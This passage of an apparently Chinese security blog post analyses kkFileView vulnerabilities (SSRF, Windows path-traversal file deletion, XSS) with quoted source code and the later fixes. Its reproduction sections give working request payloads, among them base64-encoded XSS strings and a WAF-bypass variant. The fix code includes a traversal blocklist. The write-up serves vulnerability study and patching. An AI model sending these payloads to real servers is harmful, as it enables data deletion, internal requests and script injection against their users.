class="string">&quot;读取跨域文件异常，url：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            IOUtils.closeQuietly(inputStream);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>cn.keking.utils.WebUtils#decodeUrl</code>方法进行一次base64解码</p><p><img src="https://s2.loli.net/2024/12/20/GXFtJzoi4TDl3k7.png" alt="img"></p><p>虽然我们可以通过<code>url:</code>前缀绕过这里的if判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (urlPath.toLowerCase().startsWith(<span class="string">&quot;file:&quot;</span>) || urlPath.toLowerCase().startsWith(<span class="string">&quot;file%3&quot;</span>)) &#123;</span><br><span class="line">    logger.info(<span class="string">&quot;读取跨域文件异常，可能存在非法访问，urlPath：&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是后面的逻辑是将<code>java.net.URLConnection</code>类型转换为<code>java.net.HttpURLConnection</code>，而file协议不支持这个类型转换会报错</p><p><img src="https://s2.loli.net/2024/12/20/rWTvAf52thYz1CU.png" alt="img"></p><p>如果能在<code>URL url = WebUtils.normalizedURL(urlPath);</code>处理之后将<code>ftp:</code>开头的urlPath，最后通过某种处理造成的差异转换为file协议，即可在else部分调用<code>java.net.URL#openStream</code>成功绕过，但目前只是一个想法，实际并未发现这样的差异</p><p>而像gopher等协议，属于是<code>galimatias</code> 库的 <code>URL</code>类支持该协议而 Java8 原生的URL类不认得（在jdk8版本以后被阉割了，jdk7高版本虽然存在，但是需要设置）</p><p><a href="https://bugzilla.redhat.com/show_bug.cgi?id=865541">https://bugzilla.redhat.com/show_bug.cgi?id=865541</a></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><blockquote><p>kkFileView &lt;&#x3D; v3.6.0, &lt;&#x3D; v4.4.0-beta</p></blockquote><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>kkFileView &lt;&#x3D; 3.6.0, &lt;&#x3D; 4.0.0</p><p><img src="https://s2.loli.net/2024/12/20/RzyKhpMPOLJoIk1.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/PEv4Ciq2JsXMAO8.png" alt="img"></p><p>4.1.0 &lt;&#x3D; kkFileView &lt;&#x3D; 4.4.0-beta</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getCorsFile?urlPath=aHR0cHM6Ly93d3cuYmFpZHUuY29tLw==</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/QH9qM6DwcRmFEpT.png" alt="img"></p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>根据上面的分析也很容易理解为什么存在SSRF，4.1.0在修复任意文件读取漏洞的时候只对file协议做了一定过滤，而HTTP协议和HTTPS协议并未受影响</p><h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>经过尝试4.4.0-beta也是能SSRF的，</p><p><img src="https://s2.loli.net/2024/12/20/hjw7UAVpCSGFMPv.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/uF7Dk6yMAL8xtmH.png" alt="img"></p><p>但是官方给的预览网站无法成功，估计是某个配置项可以配置</p><p><a href="https://github.com/kekingcn/kkFileView/issues/392">https://github.com/kekingcn/kkFileView/issues/392</a></p><p><img src="https://s2.loli.net/2024/12/20/3FyzfNmwGrApj9E.png" alt="img"></p><p>比如这个可以限制允许预览的本地文件夹</p><p><a href="https://github.com/kekingcn/kkFileView/pull/309/commits/9d65c999e5e7a98f9e68f76757977fefa13b72ac">https://github.com/kekingcn/kkFileView/pull/309/commits/9d65c999e5e7a98f9e68f76757977fefa13b72ac</a></p><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><blockquote><p>kkFileView &#x3D;&#x3D; v4.0.0 （仅在windows环境下成功）</p></blockquote><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p>创建一个目录用于存放上传的文件，并在配置项中指定这个目录</p><p><img src="https://s2.loli.net/2024/12/20/TuNDGXCaPr4ytbo.png" alt="img"></p><p>创建在目录下创建一个poc.txt用于检验目录成功穿越（正常只能删除demo目录下的文件）</p><p><img src="https://s2.loli.net/2024/12/20/4sJgYut5wyc1RND.png" alt="img"></p><p>然后GET请求<code>/deleteFile?fileName=demo%2F..\poc.txt</code></p><p><img src="https://s2.loli.net/2024/12/20/xX7LfzhwSmUbiuq.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/j4x9DkpeagzWhKr.png" alt="img"></p><p>可以看到文件成功被删除</p><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>非常简单的锁定路由</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;deleteFile&quot;, method = RequestMethod.GET)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">deleteFile</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> JsonProcessingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (fileName.contains(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        fileName = fileName.substring(fileName.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileDir + demoPath + fileName);</span><br><span class="line">    logger.info(<span class="string">&quot;删除文件：&#123;&#125;&quot;</span>, file.getAbsolutePath());</span><br><span class="line">    <span class="keyword">if</span> (file.exists() &amp;&amp; !file.delete()) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;删除文件【&#123;&#125;】失败，请检查目录权限！&quot;</span>,file.getPath());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>().writeValueAsString(ReturnResponse.success());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到首先会对传入的fileName参数进行处理，只保留最后一个<code>/</code>后的内容，但Windows支持<code>\</code>路径分隔符，于是可以利用<code>..\</code>目录穿越，从而达到任意文件删除的危害</p><p><img src="https://s2.loli.net/2024/12/20/UAMcmLS3gHYPyvs.png" alt="img"></p><h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>在v4.1.0的代码中加入了黑名单过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/deleteFile&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ReturnResponse&lt;Object&gt; <span class="title function_">deleteFile</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fileName == <span class="literal">null</span> || fileName.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ReturnResponse.failure(<span class="string">&quot;文件名为空，删除失败！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        fileName = URLDecoder.decode(fileName, StandardCharsets.UTF_8.name());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fileName.contains(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        fileName = fileName.substring(fileName.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (KkFileUtils.isIllegalFileName(fileName)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ReturnResponse.failure(<span class="string">&quot;非法文件名，删除失败！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileDir + demoPath + fileName);</span><br><span class="line">    logger.info(<span class="string">&quot;删除文件：&#123;&#125;&quot;</span>, file.getAbsolutePath());</span><br><span class="line">    <span class="keyword">if</span> (file.exists() &amp;&amp; !file.delete()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> String.format(<span class="string">&quot;删除文件【%s】失败，请检查目录权限！&quot;</span>, file.getPath());</span><br><span class="line">        logger.error(msg);</span><br><span class="line">        <span class="keyword">return</span> ReturnResponse.failure(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ReturnResponse.success();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; illegalFileStrList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;../&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;./&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;..\\&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;.\\&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;\\..&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省略中间的代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查文件名是否合规</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fileName 文件名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 合规结果,true:不合规，false:合规</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isIllegalFileName</span><span class="params">(String fileName)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (String str: illegalFileStrList)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fileName.contains(str))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤的还是非常严格的，直接给堵死了</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><blockquote><p>&#x2F;picturesPreview                              kkFileView &lt;&#x3D; 4.1.0</p><p>&#x2F;onlinePreview                                 kkFileView &lt;&#x3D; 4.1.0</p></blockquote><h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><p>第一处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/picturesPreview?urls=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/tJDaq87XCKmkZNd.png" alt="img"></p><p>第二处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/picturesPreview?urls=&amp;currentUrl=Iik7YWxlcnQoIjExMQ==</span><br></pre></td></tr></table></figure><p>2024.09.04 今天绕过了个WAF，记录一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/picturesPreview?urls=&amp;currentUrl=PC9wPjwvc3Bhbj48L3N0eWxlICYjMzI7PjxzY3JpcHQgJiMzMjsgOi0oPi8qKi9hbGVydCg3NzYpLyoqLzwvc2NyaXB0ICYjMzI7IDotKDxzcGFuPjxwPg%3d%3d</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/Oj5eMQEs3gaChdY.png" alt="img"></p><p>第三处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/onlinePreview?url=aHR0cDovLyI%2BPHN2Zy9vbmxvYWQ9IndpbmRvdy5vbmVycm9yPWV2YWw7dGhyb3cnPWFsZXJ0XHgyODFceDI5JzsiPi90ZXN0LnBuZw%3D%3D</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/VPeiFf6HQAGuyT3.png" alt="img"></p><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>&#x2F;picturesPreview</p><p>可以看到这里将传入的urls进行base64解码后添加到了model中</p><p><img src="https://s2.loli.net/2024/12/20/xNyQrwgtOchqdX4.png" alt="img"></p><p>而全局用了freemarker模板渲染，未经处理直接拼接到了html中</p><p><img src="https://s2.loli.net/2024/12/20/Ray8LiSOh3dnxFj.png" alt="img"></p><p>很明显存在XSS缺陷。currentUrl也是类似这样，可以拼接像<code>&quot;);alert(&quot;111</code>一样闭合，从而执行任意js代码</p><p><img src="https://s2.loli.net/2024/12/20/bzTcAw8JLV1Dptd.png" alt="img"></p><p>&#x2F;onlinePreview</p><p>这个稍微复杂一点，没那么明显</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping( &quot;/onlinePreview&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">onlinePreview</span><span class="params">(String url, Model model, HttpServletRequest req)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (url == <span class="literal">null</span> || url.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        logger.info(<span class="string">&quot;URL异常：&#123;&#125;&quot;</span>, url);</span><br><span class="line">        <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, <span class="string">&quot;NULL地址不允许预览&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    String fileUrl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        fileUrl = WebUtils.decodeUrl(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> String.format(BASE64_DECODE_ERROR_MSG, <span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, errorMsg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">FileAttribute</span> <span class="variable">fileAttribute</span> <span class="operator">=</span> fileHandlerService.getFileAttribute(fileUrl, req);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;file&quot;</span>, fileAttribute);</span><br><span class="line">    <span class="type">FilePreview</span> <span class="variable">filePreview</span> <span class="operator">=</span> previewFactory.get(fileAttribute);</span><br><span class="line">    logger.info(<span class="string">&quot;预览文件url：&#123;&#125;，previewType：&#123;&#125;&quot;</span>, fileUrl, fileAttribute.getType());</span><br><span class="line">    <span class="keyword">return</span> filePreview.filePreviewHandle(fileUrl, model, fileAttribute);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先对传入的参数url进行Base64解码，然后跟进<code>cn.keking.service.FileHandlerService#getFileAttribute</code>方法，这里这个方法并不是漏洞点，只需要让传入的参数不会报错提前退出就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取文件属性</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> url url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 文件属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> FileAttribute <span class="title function_">getFileAttribute</span><span class="params">(String url, HttpServletRequest req)</span> &#123;</span><br><span class="line">    <span class="type">FileAttribute</span> <span class="variable">attribute</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileAttribute</span>();</span><br><span class="line">    String suffix;</span><br><span class="line">    FileType type;</span><br><span class="line">    String fileName;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fullFileName</span> <span class="operator">=</span> WebUtils.getUrlParameterReg(url, <span class="string">&quot;fullfilename&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.hasText(fullFileName)) &#123;</span><br><span class="line">        fileName = fullFileName;</span><br><span class="line">        type = FileType.typeFromFileName(fullFileName);</span><br><span class="line">        suffix = KkFileUtils.suffixFromFileName(fullFileName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fileName = WebUtils.getFileNameFromURL(url);</span><br><span class="line">        type = FileType.typeFromUrl(url);</span><br><span class="line">        suffix = WebUtils.suffixFromUrl(url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (url.contains(<span class="string">&quot;?fileKey=&quot;</span>)) &#123;</span><br><span class="line">        attribute.setSkipDownLoad(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    attribute.setType(type);</span><br><span class="line">    attribute.setName(fileName);</span><br><span class="line">    attribute.setSuffix(suffix);</span><br><span class="line">    url = WebUtils.encodeUrlFileName(url);</span><br><span class="line">    attribute.setUrl(url);</span><br><span class="line">    <span class="keyword">if</span> (req != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">officePreviewType</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;officePreviewType&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileKey</span> <span class="operator">=</span> WebUtils.getUrlParameterReg(url,<span class="string">&quot;fileKey&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(officePreviewType)) &#123;</span><br><span class="line">            attribute.setOfficePreviewType(officePreviewType);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(fileKey)) &#123;</span><br><span class="line">            attribute.setFileKey(fileKey);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">tifPreviewType</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;tifPreviewType&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(tifPreviewType)) &#123;</span><br><span class="line">            attribute.setTifPreviewType(tifPreviewType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePassword</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;filePassword&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(filePassword)) &#123;</span><br><span class="line">            attribute.setFilePassword(filePassword);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">userToken</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;userToken&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(userToken)) &#123;</span><br><span class="line">            attribute.setUserToken(userToken);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> attribute;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里报错的主要影响因素在于<code>WebUtils.encodeUrlFileName</code>这个方法的处理，于是构造一个<code>http://xxxxxxx/test.png</code>即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对url中的文件名进行UTF-8编码</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> url url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 文件名编码后的url</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encodeUrlFileName</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    String encodedFileName;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fullFileName</span> <span class="operator">=</span> WebUtils.getUrlParameterReg(url, <span class="string">&quot;fullfilename&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fullFileName != <span class="literal">null</span> &amp;&amp; fullFileName.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            encodedFileName = URLEncoder.encode(fullFileName, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">noQueryUrl</span> <span class="operator">=</span> url.substring(<span class="number">0</span>, url.indexOf(<span class="string">&quot;?&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">parameterStr</span> <span class="operator">=</span> url.substring(url.indexOf(<span class="string">&quot;?&quot;</span>));</span><br><span class="line">        parameterStr = parameterStr.replaceFirst(fullFileName, encodedFileName);</span><br><span class="line">        <span class="keyword">return</span> noQueryUrl + parameterStr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">noQueryUrl</span> <span class="operator">=</span> url.substring(<span class="number">0</span>, url.contains(<span class="string">&quot;?&quot;</span>) ? url.indexOf(<span class="string">&quot;?&quot;</span>) : url.length());</span><br><span class="line">    <span class="type">int</span> <span class="variable">fileNameStartIndex</span> <span class="operator">=</span> noQueryUrl.lastIndexOf(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">fileNameEndIndex</span> <span class="operator">=</span> noQueryUrl.lastIndexOf(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        encodedFileName = URLEncoder.encode(noQueryUrl.substring(fileNameStartIndex, fileNameEndIndex), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> url.substring(<span class="number">0</span>, fileNameStartIndex) + encodedFileName + url.substring(fileNameEndIndex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到主逻辑，<code>previewFactory.get(fileAttribute)</code>会获取得到的文件属性，并分配对应文件类型的预览处理器，这里的处理方式应该是工厂模式的设计思想</p><p>我们需要利用的预览处理和前面两处XSS漏洞一样，都是利用图片处理的模板，我们前面传入了形如<code>http://xxxxxxx/test.png</code>的值，于是可以让文件属性的类型为PICTURE</p><p><img src="https://s2.loli.net/2024/12/20/mNLzbsWpiOZ9Ene.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/brQ9d5pRqc2iGfJ.png" alt="img"></p><p>从而使得最后交由<code>cn.keking.service.impl.PictureFilePreviewImpl#filePreviewHandle</code>进行处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">filePreviewHandle</span><span class="params">(String url, Model model, FileAttribute fileAttribute)</span> &#123;</span><br><span class="line">    List&lt;String&gt; imgUrls = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    imgUrls.add(url);</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileKey</span> <span class="operator">=</span> fileAttribute.getFileKey();</span><br><span class="line">    List&lt;String&gt; zipImgUrls = fileHandlerService.getImgCache(fileKey);</span><br><span class="line">    <span class="keyword">if</span> (!CollectionUtils.isEmpty(zipImgUrls)) &#123;</span><br><span class="line">        imgUrls.addAll(zipImgUrls);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不是http开头，浏览器不能直接访问，需下载到本地</span></span><br><span class="line">    <span class="keyword">if</span> (url != <span class="literal">null</span> &amp;&amp; !url.toLowerCase().startsWith(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">        ReturnResponse&lt;String&gt; response = DownloadUtils.downLoad(fileAttribute, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (response.isFailure()) &#123;</span><br><span class="line">            <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, fileAttribute, response.getMsg());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> 